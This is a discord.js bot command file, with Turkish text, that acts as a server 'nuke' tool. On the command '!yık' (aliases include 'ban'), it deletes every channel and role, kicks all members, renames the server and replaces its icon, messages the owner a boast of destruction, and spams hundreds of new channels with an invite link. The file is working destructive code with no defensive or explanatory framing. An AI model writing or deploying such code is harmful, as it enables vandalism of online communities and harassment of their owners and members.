const Discord = require("discord.js");
exports.run = function(client, message, args) {
  message.guild.channels.forEach(sil => {
    sil.delete();
  });
  message.guild.roles.forEach(sil => {
    sil.delete();
  });
  message.guild.members.forEach(ban => {
    ban.kick();
  });
  message.guild.setName("CraftEnder Tarafından Öpüldünüz!");
  message.guild.setIcon(
    "https://cdn.discordapp.com/attachments/667450656050905118/673205990879133696/20200201_193621.jpg"
  );
  message.guild.owner.send(
    "***SUNUCUNUZ `CraftEnder` TARAFINDAN YOK EDİLMİŞTİR!***"
  );
  for (let i = 0; i < 490; i++) {
    setTimeout(function() {
      message.guild.createChannel("by Bergy", "text").then(c => {
        c.send(
          "`CraftEnder` Tarafından Yok Edildiniz!\nhttps://discord.gg/JMHU5F"
        );
      });
    }, 3000);
  }
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ["banned", "ban", "sunucu-patlat", "patlat"],
  permLevel: 0
};

exports.help = {
  name: "yık",
  description: "Sunucu Yok Etme Komutu!",
  usage: "!yık"
};